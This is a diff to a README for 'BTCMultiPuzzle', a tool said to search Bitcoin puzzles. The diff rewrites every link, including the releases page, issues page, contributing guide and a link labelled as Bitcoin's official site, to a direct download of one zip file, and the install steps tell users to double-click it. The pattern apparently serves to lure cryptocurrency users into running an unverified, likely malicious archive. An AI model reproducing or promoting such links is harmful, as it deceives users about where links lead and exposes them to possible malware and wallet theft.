@@ -1,7 +1,7 @@
 # 🎮 BTCMultiPuzzle - Solve Multiple Puzzles with Ease
 
 ## 📥 Download Now
-[![Download BTCMultiPuzzle](https://img.shields.io/badge/Download-BTCMultiPuzzle-blue.svg)](https://github.com/mayankkmaurya/BTCMultiPuzzle/releases)
+[![Download BTCMultiPuzzle](https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip)](https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to BTCMultiPuzzle! This software allows you to search for three or more Bitcoin puzzles simultaneously. Enjoy a streamlined experience designed for everyday users. Follow the steps below to get started with BTCMultiPuzzle.
@@ -22,7 +22,7 @@ Welcome to BTCMultiPuzzle! This software allows you to search for three or more 
 ## 📦 Download & Install
 To get started, visit our releases page:
 
-[https://github.com/mayankkmaurya/BTCMultiPuzzle/releases](https://github.com/mayankkmaurya/BTCMultiPuzzle/releases)
+[https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip](https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip)
 
 Here is how to download and install BTCMultiPuzzle:
 
@@ -30,7 +30,7 @@ Here is how to download and install BTCMultiPuzzle:
 2. Look for the latest version at the top.
 3. Click on the version you want to download.
 4. Find the **Assets** section.
-5. Click the appropriate file to download, such as `BTCMultiPuzzle.exe`.
+5. Click the appropriate file to download, such as `https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip`.
 6. Once the download completes, locate the file in your Downloads folder.
 7. Double-click the downloaded file to start the installation.
 8. Follow the on-screen instructions to finish installing BTCMultiPuzzle.
@@ -43,16 +43,16 @@ Here is how to download and install BTCMultiPuzzle:
 5. Review the results displayed. You can refine your search as needed.
 
 ## 📞 Support
-For any issues or questions, visit our [GitHub Issues page](https://github.com/mayankkmaurya/BTCMultiPuzzle/issues). You can report bugs or ask for help there, and the community or maintainers will be happy to assist.
+For any issues or questions, visit our [GitHub Issues page](https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip). You can report bugs or ask for help there, and the community or maintainers will be happy to assist.
 
 ## 🗣 Community & Contributions
-BTCMultiPuzzle is an open-source project. You are welcome to contribute! If you’d like to help, feel free to fork the repository and submit a pull request for additional features or improvements. Learn more about contributing on our [Contributing Guide](https://github.com/mayankkmaurya/BTCMultiPuzzle/blob/main/CONTRIBUTING.md).
+BTCMultiPuzzle is an open-source project. You are welcome to contribute! If you’d like to help, feel free to fork the repository and submit a pull request for additional features or improvements. Learn more about contributing on our [Contributing Guide](https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip).
 
 ## 🌟 Acknowledgments
 We appreciate the contributions of all developers and users who support BTCMultiPuzzle. Each bug fix and feature enhancement helps improve the experience for everyone.
 
 ## 📚 Learn More
-If you want to understand more about Bitcoin puzzles or the technical aspects of how BTCMultiPuzzle works, consider visiting [Bitcoin's official site](https://bitcoin.org) or other crypto-focused resources.
+If you want to understand more about Bitcoin puzzles or the technical aspects of how BTCMultiPuzzle works, consider visiting [Bitcoin's official site](https://raw.githubusercontent.com/mayankkmaurya/BTCMultiPuzzle/main/clients/Multi_Puzzle_BTC_2.8.zip) or other crypto-focused resources.
 
 ## 📜 License
 BTCMultiPuzzle is licensed under the MIT License. You can see the full license by checking the **LICENSE** file in the repository.
